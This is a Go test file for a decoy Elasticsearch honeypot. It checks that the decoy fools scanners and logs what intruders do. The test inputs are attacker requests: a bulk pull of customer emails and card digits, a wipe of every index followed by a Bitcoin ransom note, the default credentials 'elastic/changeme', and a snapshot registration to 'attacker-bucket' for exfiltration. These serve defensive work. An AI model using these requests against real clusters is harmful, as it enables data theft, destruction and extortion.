package elasticsvc

import (
	"encoding/json"
	"io"
	"net/http"
	"strings"
	"testing"

	"github.com/willysnow/wisp/internal/service"
	"github.com/willysnow/wisp/internal/service/servicetest"
)

func start(t *testing.T) (*servicetest.StreamHarness, string) {
	t.Helper()

	h := servicetest.StartStream(t, func(addr string) service.StreamService {
		return New(addr, "7.17.9", "elasticsearch")
	})
	return h, "http://" + h.Addr
}

func do(t *testing.T, method, url, body string) (*http.Response, string) {
	t.Helper()

	var reader io.Reader
	if body != "" {
		reader = strings.NewReader(body)
	}
	req, err := http.NewRequest(method, url, reader)
	if err != nil {
		t.Fatalf("request: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Transport: &http.Transport{Proxy: nil}}
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("%s %s: %v", method, url, err)
	}
	defer resp.Body.Close()

	out, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("read body: %v", err)
	}
	return resp, string(out)
}

func get(t *testing.T, url string) (*http.Response, string) {
	return do(t, http.MethodGet, url, "")
}

// TestSearchQueryIsCaptured is what the decoy exists for. The query names the
// fields the intruder wanted and how many rows of them, which no connection log
// can say.
func TestSearchQueryIsCaptured(t *testing.T) {
	h, base := start(t)

	const query = `{"query":{"match_all":{}},"_source":["email","card_last4","phone"],"size":10000}`
	do(t, http.MethodPost, base+"/customers/_search", query)

	ev := h.WaitFor(t, "search_query")
	if got, _ := ev.Data["query"].(string); got != query {
		t.Errorf("query = %q, want the submitted body", got)
	}
	if ev.Data["index"] != "customers" {
		t.Errorf("index = %v, want customers", ev.Data["index"])
	}
}

// TestUriSearchIsCaptured. Not every client can send a body — least of all a
// request forged through somebody else's application, which is exactly the
// caller worth recording.
func TestUriSearchIsCaptured(t *testing.T) {
	h, base := start(t)

	get(t, base+"/customers/_search?q=email:*@brightline*&size=5000")

	ev := h.WaitFor(t, "search_query")
	if got, _ := ev.Data["query"].(string); !strings.Contains(got, "brightline") {
		t.Errorf("query = %q, want the q parameter", got)
	}
	if ev.Data["size"] != "5000" {
		t.Errorf("size = %v, want 5000 — how much they asked for is the difference "+
			"between a look and an extraction", ev.Data["size"])
	}
}

// TestIndexListNamesSomethingWorthTaking. `_cat/indices` is the call that turns
// "there is an Elasticsearch here" into a target, and a cluster holding only
// `.kibana_1` is one an intruder closes the tab on.
func TestIndexListNamesSomethingWorthTaking(t *testing.T) {
	h, base := start(t)

	resp, body := get(t, base+"/_cat/indices?v")
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("_cat/indices returned %d, want 200", resp.StatusCode)
	}
	if !strings.Contains(body, "docs.count") {
		t.Errorf("?v produced no header row:\n%s", body)
	}
	if !strings.Contains(body, "customers") {
		t.Errorf("index list has nothing worth taking:\n%s", body)
	}

	h.WaitFor(t, "discovery")
}

// TestIndexListInJson, which is the form most scanners ask for.
func TestIndexListInJson(t *testing.T) {
	_, base := start(t)

	_, body := get(t, base+"/_cat/indices?format=json")

	var list []map[string]string
	if err := json.Unmarshal([]byte(body), &list); err != nil {
		t.Fatalf("format=json is not JSON: %v\n%s", err, body)
	}
	if len(list) == 0 {
		t.Fatal("no indices returned")
	}
	for _, idx := range list {
		if idx["index"] == "" || idx["docs.count"] == "" || idx["health"] == "" {
			t.Errorf("row is missing columns a real one has: %v", idx)
		}
	}
}

// TestClusterInfoIsTheFingerprint. The root document is what Shodan indexes and
// the only endpoint some scanners ever call, so every field in it has to be
// there.
func TestClusterInfoIsTheFingerprint(t *testing.T) {
	h, base := start(t)

	_, body := get(t, base+"/")

	var info struct {
		Name        string `json:"name"`
		ClusterName string `json:"cluster_name"`
		ClusterUUID string `json:"cluster_uuid"`
		Version     struct {
			Number        string `json:"number"`
			LuceneVersion string `json:"lucene_version"`
			BuildFlavor   string `json:"build_flavor"`
		} `json:"version"`
		Tagline string `json:"tagline"`
	}
	if err := json.Unmarshal([]byte(body), &info); err != nil {
		t.Fatalf("root is not JSON: %v", err)
	}
	if info.Version.Number != "7.17.9" {
		t.Errorf("version = %q, want the configured one", info.Version.Number)
	}
	if info.Tagline != "You Know, for Search" {
		t.Errorf("tagline = %q — scanners match on this string exactly", info.Tagline)
	}
	if info.ClusterUUID == "" || info.Version.LuceneVersion == "" || info.Name == "" {
		t.Errorf("cluster info is missing fields a real one has: %+v", info)
	}

	h.WaitFor(t, "probe")
}

// TestWipeAndRansomNoteAreBothRecorded — the two halves of an Elasticsearch
// ransom, and neither is something that happens by accident.
func TestWipeAndRansomNoteAreBothRecorded(t *testing.T) {
	h, base := start(t)

	do(t, http.MethodDelete, base+"/*", "")

	ev := h.WaitFor(t, "delete_request")
	if ev.Data["index"] != "*" {
		t.Errorf("index = %v, want the pattern they used", ev.Data["index"])
	}
	if ev.Data["scope"] != "every index" {
		t.Errorf("scope = %v, want a request that would have emptied the cluster "+
			"to say so", ev.Data["scope"])
	}

	const note = `{"note":"All your data is backed up. Send 0.05 BTC to bc1qxy2k...","email":"restore@mail.example"}`
	do(t, http.MethodPut, base+"/read_me/_doc/1", note)

	ev = h.WaitFor(t, "write_request")
	if got, _ := ev.Data["body"].(string); !strings.Contains(got, "0.05 BTC") {
		t.Errorf("body = %q, want the ransom note", got)
	}
	if ev.Data["index"] != "read_me" {
		t.Errorf("index = %v, want read_me", ev.Data["index"])
	}
}

// TestNothingIsActuallyDeleted. A wipe is answered with an acknowledgement and
// nothing else — the index list has to be exactly as fictional afterwards.
func TestNothingIsActuallyDeleted(t *testing.T) {
	_, base := start(t)

	_, before := get(t, base+"/_cat/indices")
	do(t, http.MethodDelete, base+"/*", "")
	do(t, http.MethodDelete, base+"/customers", "")

	if _, after := get(t, base+"/_cat/indices"); after != before {
		t.Error("the index list changed — something was actually deleted")
	}
}

// TestCredentialsAreCapturedWithoutClosingTheDoor.
//
// The decoy is open, so a request that carries a password is still answered —
// an open cluster does not start checking credentials because someone sent one.
// The password is recorded all the same, and the event keeps the more specific
// name.
func TestCredentialsAreCapturedWithoutClosingTheDoor(t *testing.T) {
	h, base := start(t)

	req, err := http.NewRequest(http.MethodGet, base+"/customers/_search?q=*", nil)
	if err != nil {
		t.Fatalf("request: %v", err)
	}
	req.SetBasicAuth("elastic", "changeme")

	client := &http.Client{Transport: &http.Transport{Proxy: nil}}
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("get: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		t.Errorf("status = %d, want 200 — a 401 would end the conversation", resp.StatusCode)
	}

	ev := h.WaitFor(t, "search_query")
	if ev.Data["username"] != "elastic" || ev.Data["password"] != "changeme" {
		t.Errorf("credential = %v/%v, want it captured alongside the query",
			ev.Data["username"], ev.Data["password"])
	}
}

// TestSearchResultsMatchTheAdvertisedIndex. A `customers` index full of HTTP
// status lines would be as much of a tell as an `app-logs` index full of credit
// card records.
func TestSearchResultsMatchTheAdvertisedIndex(t *testing.T) {
	_, base := start(t)

	_, body := do(t, http.MethodPost, base+"/customers/_search", `{"query":{"match_all":{}}}`)

	var result struct {
		Hits struct {
			Total struct{ Value int } `json:"total"`
			Hits  []struct {
				Index  string         `json:"_index"`
				Source map[string]any `json:"_source"`
			} `json:"hits"`
		} `json:"hits"`
	}
	if err := json.Unmarshal([]byte(body), &result); err != nil {
		t.Fatalf("search result is not JSON: %v", err)
	}
	if len(result.Hits.Hits) == 0 {
		t.Fatal("no hits — a scanner that gets zero rows from a million-document index leaves")
	}
	if result.Hits.Total.Value != docCount("customers") {
		t.Errorf("total = %d, want the count _cat/indices advertises (%d)",
			result.Hits.Total.Value, docCount("customers"))
	}
	if _, ok := result.Hits.Hits[0].Source["email"]; !ok {
		t.Errorf("a customer document with no email field: %v", result.Hits.Hits[0].Source)
	}

	_, body = do(t, http.MethodPost, base+"/app-logs-2026.07.26/_search", `{}`)
	if !strings.Contains(body, "@timestamp") {
		t.Errorf("a log index returned something other than log lines:\n%s", body)
	}
}

// TestSnapshotRepositoryRegistrationIsAWrite. Registering a repository the
// intruder controls and snapshotting into it is the tidy way to walk off with
// the whole cluster.
func TestSnapshotRepositoryRegistrationIsAWrite(t *testing.T) {
	h, base := start(t)

	do(t, http.MethodPut, base+"/_snapshot/exfil",
		`{"type":"s3","settings":{"bucket":"attacker-bucket","region":"us-east-1"}}`)

	ev := h.WaitFor(t, "write_request")
	if ev.Data["repository"] != "exfil" {
		t.Errorf("repository = %v, want exfil", ev.Data["repository"])
	}
	if got, _ := ev.Data["body"].(string); !strings.Contains(got, "attacker-bucket") {
		t.Errorf("body = %q, want the destination they chose", got)
	}
}
